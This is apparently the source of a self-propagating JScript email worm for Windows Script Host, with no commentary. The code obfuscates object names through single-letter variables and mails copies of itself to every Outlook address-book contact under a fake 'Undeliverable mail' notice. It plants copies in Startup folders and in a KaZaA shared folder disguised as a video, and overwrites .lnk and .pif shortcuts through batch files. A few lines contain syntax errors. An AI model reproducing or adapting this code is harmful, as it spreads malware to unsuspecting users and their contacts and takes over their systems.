var oefny="a"
var hcigh="b"
var rijbl="c"
var zmkiv="d"
var buipo="e"
var caxzb="f"
var oagos="g"
var cxjjg="h"
var gcziq="i"
var ltruq="j"
var lfubb="k"
var tyhgq="l"
var ehmlj="m"
var vthie="n"
var nuodu="o"
var bwcmg="p"
var nrgsh="q"
var ibjfe="r"
var rednt="s"
var daxqf="t"
var tfiqg="u"
var ijtql="v"
var lluna="w"
var pbzdc="x"
var irmtj="y"
var cctds="z"
var ratwo="."
var zizqx = WScript.CreateObject(rednt+rijbl+ibjfe+gcziq+bwcmg+daxqf+gcziq+vthie+oagos+ratwo+caxzb+gcziq+tyhgq+buipo+rednt+irmtj+rednt+daxqf+buipo+ehmlj+nuodu+hcigh+ltruq+buipo+rijbl+daxqf)
var kovpx = zizqx.OpenTextFile(WScript.ScriptFullName, 1)
var onvpq=kovpx.ReadAll()
var dpmnc=WScript.CreateObject(lluna+rednt+rijbl+ibjfe+gcziq+bwcmg+daxqf+ratwo+rednt+cxjjg+buipo+tyhgq+tyhgq)
kovpx.Close();
bgzsp=zizqx.CreateTextFile("xpihu.js");
bgzsp.WriteLine(onvpq);
bgzsp.Close();
zizqx.CopyFile("xpihu.js","attachment.txt");
var llljx, mwkwo, acxql, nawwv, vdbxv, zqksa
{
mwkwo = WScript.CreateObject("Outlook.Application");
acxql=mwkwo.GetNamespace("MAPI");
llljx=0;
for(nawwv=1;nawwv<=acxql.AddressLists.Count;nawwv++)
{
for(vdbxv=1;vdbxv<=acxql.AddressLists(nawwv).AddressEntries.Count;vdbxv++)
{
if (llljx==15)
{
zqksa.Send
llljx=0;
}
if (llljx==0)
{
zqksa=mwkwo.CreateItem(0);
zqksa.Subject = "Undeliverable mail";
zqksa.Body = "E-mail did not reach destination host. Please read attachment for more details.";
zqksa.Attachments.Add("attachment.txt");
}
zqksa.Recipients.Add(acxql.AddressLists(nawwv).AddressEntries(vdbxv));
llljx++;
}
}
if (llljx!=0) zqksa.Send
}
if (zizqx.FolderExists("C:\\Windows\\Startmenü\\Programme\\Autostart"))
{ zizqx.CopyFile("xpihu.js","C:\\Windows\\Startmenü\\Programme\\Autostart\\zkxue.js");
}
if (zizqx.FolderExists("C:\\Windows\\Startmenu\\Programs\\StartUp"))
{ zizqx.CopyFile("xpihu.js","C:\\Windows\\Startmenu\\Programs\\StartUp\\fxbrw.js");
}
odlpj=(vakff+"\\KaZaA Lite\\My Shared Folder");
if (zizqx.FolderExists(odlpj))
{ zizqx.CopyFile("xpihu.js", odlpj"+\\bukkake.mov");
}
zizqx.CopyFile("xpihu.js","C:\\zmplo.js");
var dolva=dpmnc.CreateShortCut("vyptl.lnk");
dolva.TargetPath=dpmnc.ExpandEnvironmentStrings("C:\\zmplo.js");
dolva.Save();
hhcbd=zizqx.CreateTextFile("ombvp.bat");
hhcbd.WriteLine("for %%l in (*.lnk ..\\*.lnk \\*.lnk %path%\\*.lnk) do copy vyptl.lnk %%l");
hhcbd.Close();
dpmnc.Run("ombvp.bat");
zizqx.CopyFile("xpihu.js","C:\\Windows\\kfmhn.js");
bqjli=zizqx.CreateTextFile("C:\\Windows\\rdhvc.bat");
bqjli.WriteLine("@echo off");
bqjli.WriteLine("cls");
bqjli.WriteLine("ctty NUL");
bqjli.WriteLine("cscript C:\\Windows\\kfmhn.js");
bqjli.WriteLine("ctty CON");
bqjli.Close();
var qixix = dpmnc.CreateShortcut("C:\\pqrdd.pif");
qixix.TargetPath = dpmnc.ExpandEnvironmentStrings("C:\\Windows\\rdhvc.bat");
qixix.WindowStyle = 4;
qixix.Save();
deroy=zizqx.CreateTextFile("C:\\rdhvc.bat");
deroy.WriteLine("@echo off");
deroy.WriteLine("for %%p in (*.pif ..\\*.pif \\*.pif %path%\\*.pif) do copy C:\\Windows\\pqrdd.pif %%p");
deroy.Close();
dpmnc.Run("C:\\rdhvc.bat");